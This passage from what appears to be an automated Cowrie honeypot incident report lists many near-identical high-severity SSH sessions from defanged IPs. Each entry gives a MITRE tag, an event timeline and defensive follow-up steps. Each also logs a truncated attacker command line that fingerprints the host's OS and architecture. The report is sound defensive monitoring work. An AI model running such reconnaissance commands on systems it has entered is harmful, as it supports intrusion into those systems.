| `2026-07-05 05:38:26` | `cowrie.login.success` |
| `2026-07-05 05:38:28` | `cowrie.session.params` |
| `2026-07-05 05:38:28` | `cowrie.command.input` |
| `2026-07-05 05:38:30` | `cowrie.log.closed` |
| `2026-07-05 05:38:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c91e72243261

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:38 |
| **Last Seen** | 2026-07-05 05:38 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:38:32` | `cowrie.session.connect` |
| `2026-07-05 05:38:33` | `cowrie.client.version` |
| `2026-07-05 05:38:33` | `cowrie.client.kex` |
| `2026-07-05 05:38:38` | `cowrie.login.success` |
| `2026-07-05 05:38:42` | `cowrie.session.params` |
| `2026-07-05 05:38:42` | `cowrie.command.input` |
| `2026-07-05 05:38:42` | `cowrie.command.input` |
| `2026-07-05 05:38:42` | `cowrie.command.input` |
| `2026-07-05 05:38:42` | `cowrie.command.input` |
| `2026-07-05 05:38:42` | `cowrie.command.input` |
| `2026-07-05 05:38:42` | `cowrie.command.success` |
| `2026-07-05 05:38:42` | `cowrie.command.input` |
| `2026-07-05 05:38:42` | `cowrie.command.input` |
| `2026-07-05 05:38:42` | `cowrie.command.input` |
| `2026-07-05 05:38:42` | `cowrie.command.input` |
| `2026-07-05 05:38:43` | `cowrie.log.closed` |
| `2026-07-05 05:38:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c41c848040bc

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:39 |
| **Last Seen** | 2026-07-05 05:39 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:39:30` | `cowrie.session.connect` |
| `2026-07-05 05:39:31` | `cowrie.client.version` |
| `2026-07-05 05:39:31` | `cowrie.client.kex` |
| `2026-07-05 05:39:36` | `cowrie.login.success` |
| `2026-07-05 05:39:39` | `cowrie.session.params` |
| `2026-07-05 05:39:39` | `cowrie.command.input` |
| `2026-07-05 05:39:39` | `cowrie.command.input` |
| `2026-07-05 05:39:39` | `cowrie.command.input` |
| `2026-07-05 05:39:39` | `cowrie.command.input` |
| `2026-07-05 05:39:39` | `cowrie.command.input` |
| `2026-07-05 05:39:39` | `cowrie.command.success` |
| `2026-07-05 05:39:39` | `cowrie.command.input` |
| `2026-07-05 05:39:39` | `cowrie.command.input` |
| `2026-07-05 05:39:39` | `cowrie.command.input` |
| `2026-07-05 05:39:39` | `cowrie.command.input` |
| `2026-07-05 05:39:40` | `cowrie.log.closed` |
| `2026-07-05 05:39:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae58dc60180e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:39 |
| **Last Seen** | 2026-07-05 05:40 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:39:58` | `cowrie.session.connect` |
| `2026-07-05 05:39:59` | `cowrie.client.version` |
| `2026-07-05 05:39:59` | `cowrie.client.kex` |
| `2026-07-05 05:40:02` | `cowrie.login.success` |
| `2026-07-05 05:40:04` | `cowrie.session.params` |
| `2026-07-05 05:40:04` | `cowrie.command.input` |
| `2026-07-05 05:40:04` | `cowrie.command.input` |
| `2026-07-05 05:40:04` | `cowrie.command.input` |
| `2026-07-05 05:40:04` | `cowrie.command.input` |
| `2026-07-05 05:40:04` | `cowrie.command.input` |
| `2026-07-05 05:40:04` | `cowrie.command.success` |
| `2026-07-05 05:40:04` | `cowrie.command.input` |
| `2026-07-05 05:40:04` | `cowrie.command.input` |
| `2026-07-05 05:40:04` | `cowrie.command.input` |
| `2026-07-05 05:40:04` | `cowrie.command.input` |
| `2026-07-05 05:40:05` | `cowrie.log.closed` |
| `2026-07-05 05:40:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7987fa9bb0c8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:40 |
| **Last Seen** | 2026-07-05 05:41 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:40:55` | `cowrie.session.connect` |
| `2026-07-05 05:40:56` | `cowrie.client.version` |
| `2026-07-05 05:40:56` | `cowrie.client.kex` |
| `2026-07-05 05:41:01` | `cowrie.login.success` |
| `2026-07-05 05:41:03` | `cowrie.session.params` |
| `2026-07-05 05:41:03` | `cowrie.command.input` |
| `2026-07-05 05:41:03` | `cowrie.command.input` |
| `2026-07-05 05:41:03` | `cowrie.command.input` |
| `2026-07-05 05:41:03` | `cowrie.command.input` |
| `2026-07-05 05:41:03` | `cowrie.command.input` |
| `2026-07-05 05:41:03` | `cowrie.command.success` |
| `2026-07-05 05:41:03` | `cowrie.command.input` |
| `2026-07-05 05:41:03` | `cowrie.command.input` |
| `2026-07-05 05:41:03` | `cowrie.command.input` |
| `2026-07-05 05:41:03` | `cowrie.command.input` |
| `2026-07-05 05:41:05` | `cowrie.log.closed` |
| `2026-07-05 05:41:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cec3f06e54f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:41 |
| **Last Seen** | 2026-07-05 05:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:41:22` | `cowrie.session.connect` |
| `2026-07-05 05:41:23` | `cowrie.client.version` |
| `2026-07-05 05:41:23` | `cowrie.client.kex` |
| `2026-07-05 05:41:26` | `cowrie.login.success` |
| `2026-07-05 05:41:27` | `cowrie.session.params` |
| `2026-07-05 05:41:27` | `cowrie.command.input` |
| `2026-07-05 05:41:27` | `cowrie.command.input` |
| `2026-07-05 05:41:27` | `cowrie.command.input` |
| `2026-07-05 05:41:27` | `cowrie.command.input` |
| `2026-07-05 05:41:27` | `cowrie.command.input` |
| `2026-07-05 05:41:27` | `cowrie.command.success` |
| `2026-07-05 05:41:27` | `cowrie.command.input` |
| `2026-07-05 05:41:27` | `cowrie.command.input` |
| `2026-07-05 05:41:27` | `cowrie.command.input` |
| `2026-07-05 05:41:27` | `cowrie.command.input` |
| `2026-07-05 05:41:27` | `cowrie.log.closed` |
| `2026-07-05 05:41:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1e4452e9fb9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:42 |
| **Last Seen** | 2026-07-05 05:42 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:42:18` | `cowrie.session.connect` |
| `2026-07-05 05:42:19` | `cowrie.client.version` |
| `2026-07-05 05:42:19` | `cowrie.client.kex` |
| `2026-07-05 05:42:23` | `cowrie.login.success` |
| `2026-07-05 05:42:26` | `cowrie.session.params` |
| `2026-07-05 05:42:26` | `cowrie.command.input` |
| `2026-07-05 05:42:26` | `cowrie.command.input` |
| `2026-07-05 05:42:26` | `cowrie.command.input` |
| `2026-07-05 05:42:26` | `cowrie.command.input` |
| `2026-07-05 05:42:26` | `cowrie.command.input` |
| `2026-07-05 05:42:26` | `cowrie.command.success` |
| `2026-07-05 05:42:26` | `cowrie.command.input` |
| `2026-07-05 05:42:26` | `cowrie.command.input` |
| `2026-07-05 05:42:26` | `cowrie.command.input` |
| `2026-07-05 05:42:26` | `cowrie.command.input` |
| `2026-07-05 05:42:27` | `cowrie.log.closed` |
| `2026-07-05 05:42:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2c0dfff853e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:42 |
| **Last Seen** | 2026-07-05 05:42 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:42:46` | `cowrie.session.connect` |
| `2026-07-05 05:42:47` | `cowrie.client.version` |
| `2026-07-05 05:42:47` | `cowrie.client.kex` |
| `2026-07-05 05:42:51` | `cowrie.login.success` |
| `2026-07-05 05:42:54` | `cowrie.session.params` |
| `2026-07-05 05:42:54` | `cowrie.command.input` |
| `2026-07-05 05:42:54` | `cowrie.command.input` |
| `2026-07-05 05:42:54` | `cowrie.command.input` |
| `2026-07-05 05:42:54` | `cowrie.command.input` |
| `2026-07-05 05:42:54` | `cowrie.command.input` |
| `2026-07-05 05:42:54` | `cowrie.command.success` |
| `2026-07-05 05:42:54` | `cowrie.command.input` |
| `2026-07-05 05:42:54` | `cowrie.command.input` |
| `2026-07-05 05:42:54` | `cowrie.command.input` |
| `2026-07-05 05:42:54` | `cowrie.command.input` |
| `2026-07-05 05:42:55` | `cowrie.log.closed` |
| `2026-07-05 05:42:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e559b506f8c2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:43 |
| **Last Seen** | 2026-07-05 05:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:43:40` | `cowrie.session.connect` |
| `2026-07-05 05:43:41` | `cowrie.client.version` |
| `2026-07-05 05:43:41` | `cowrie.client.kex` |
| `2026-07-05 05:43:46` | `cowrie.login.success` |
| `2026-07-05 05:43:48` | `cowrie.session.params` |
| `2026-07-05 05:43:48` | `cowrie.command.input` |
| `2026-07-05 05:43:48` | `cowrie.command.input` |
| `2026-07-05 05:43:48` | `cowrie.command.input` |
| `2026-07-05 05:43:48` | `cowrie.command.input` |
| `2026-07-05 05:43:48` | `cowrie.command.input` |
| `2026-07-05 05:43:48` | `cowrie.command.success` |
| `2026-07-05 05:43:48` | `cowrie.command.input` |
| `2026-07-05 05:43:48` | `cowrie.command.input` |
| `2026-07-05 05:43:48` | `cowrie.command.input` |
| `2026-07-05 05:43:48` | `cowrie.command.input` |
| `2026-07-05 05:43:49` | `cowrie.log.closed` |
| `2026-07-05 05:43:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-239a258c0ad3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:44 |
| **Last Seen** | 2026-07-05 05:44 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:44:09` | `cowrie.session.connect` |
| `2026-07-05 05:44:10` | `cowrie.client.version` |
| `2026-07-05 05:44:10` | `cowrie.client.kex` |
| `2026-07-05 05:44:14` | `cowrie.login.success` |
| `2026-07-05 05:44:17` | `cowrie.session.params` |
| `2026-07-05 05:44:17` | `cowrie.command.input` |
| `2026-07-05 05:44:17` | `cowrie.command.input` |
| `2026-07-05 05:44:17` | `cowrie.command.input` |
| `2026-07-05 05:44:17` | `cowrie.command.input` |
| `2026-07-05 05:44:17` | `cowrie.command.input` |
| `2026-07-05 05:44:17` | `cowrie.command.success` |
| `2026-07-05 05:44:17` | `cowrie.command.input` |
| `2026-07-05 05:44:17` | `cowrie.command.input` |
| `2026-07-05 05:44:17` | `cowrie.command.input` |
| `2026-07-05 05:44:17` | `cowrie.command.input` |
| `2026-07-05 05:44:19` | `cowrie.log.closed` |
| `2026-07-05 05:44:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27bdf9faa565

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:45 |
| **Last Seen** | 2026-07-05 05:45 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:45:07` | `cowrie.session.connect` |
| `2026-07-05 05:45:08` | `cowrie.client.version` |
| `2026-07-05 05:45:08` | `cowrie.client.kex` |
| `2026-07-05 05:45:13` | `cowrie.login.success` |
| `2026-07-05 05:45:16` | `cowrie.session.params` |
| `2026-07-05 05:45:16` | `cowrie.command.input` |
| `2026-07-05 05:45:16` | `cowrie.command.input` |
| `2026-07-05 05:45:16` | `cowrie.command.input` |
| `2026-07-05 05:45:16` | `cowrie.command.input` |
| `2026-07-05 05:45:16` | `cowrie.command.input` |
| `2026-07-05 05:45:16` | `cowrie.command.success` |
| `2026-07-05 05:45:16` | `cowrie.command.input` |
| `2026-07-05 05:45:16` | `cowrie.command.input` |
| `2026-07-05 05:45:16` | `cowrie.command.input` |
| `2026-07-05 05:45:16` | `cowrie.command.input` |
| `2026-07-05 05:45:18` | `cowrie.log.closed` |
| `2026-07-05 05:45:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54f3da47394f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:45 |
| **Last Seen** | 2026-07-05 05:45 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:45:33` | `cowrie.session.connect` |
| `2026-07-05 05:45:34` | `cowrie.client.version` |
| `2026-07-05 05:45:34` | `cowrie.client.kex` |
| `2026-07-05 05:45:37` | `cowrie.login.success` |
| `2026-07-05 05:45:40` | `cowrie.session.params` |
| `2026-07-05 05:45:40` | `cowrie.command.input` |
| `2026-07-05 05:45:40` | `cowrie.command.input` |
| `2026-07-05 05:45:40` | `cowrie.command.input` |
| `2026-07-05 05:45:40` | `cowrie.command.input` |
| `2026-07-05 05:45:40` | `cowrie.command.input` |
| `2026-07-05 05:45:40` | `cowrie.command.success` |
| `2026-07-05 05:45:40` | `cowrie.command.input` |
| `2026-07-05 05:45:40` | `cowrie.command.input` |
| `2026-07-05 05:45:40` | `cowrie.command.input` |
| `2026-07-05 05:45:40` | `cowrie.command.input` |
| `2026-07-05 05:45:42` | `cowrie.log.closed` |
| `2026-07-05 05:45:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90125bed7dcc

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:46 |
| **Last Seen** | 2026-07-05 05:46 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:46:38` | `cowrie.session.connect` |
| `2026-07-05 05:46:39` | `cowrie.client.version` |
| `2026-07-05 05:46:39` | `cowrie.client.kex` |
| `2026-07-05 05:46:43` | `cowrie.login.success` |
| `2026-07-05 05:46:46` | `cowrie.session.params` |
| `2026-07-05 05:46:46` | `cowrie.command.input` |
| `2026-07-05 05:46:46` | `cowrie.command.input` |
| `2026-07-05 05:46:46` | `cowrie.command.input` |
| `2026-07-05 05:46:46` | `cowrie.command.input` |
| `2026-07-05 05:46:46` | `cowrie.command.input` |
| `2026-07-05 05:46:46` | `cowrie.command.success` |
| `2026-07-05 05:46:46` | `cowrie.command.input` |
| `2026-07-05 05:46:46` | `cowrie.command.input` |
| `2026-07-05 05:46:46` | `cowrie.command.input` |
| `2026-07-05 05:46:46` | `cowrie.command.input` |
| `2026-07-05 05:46:47` | `cowrie.log.closed` |
| `2026-07-05 05:46:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56b114843107

| Field | Detail |
|---|---|
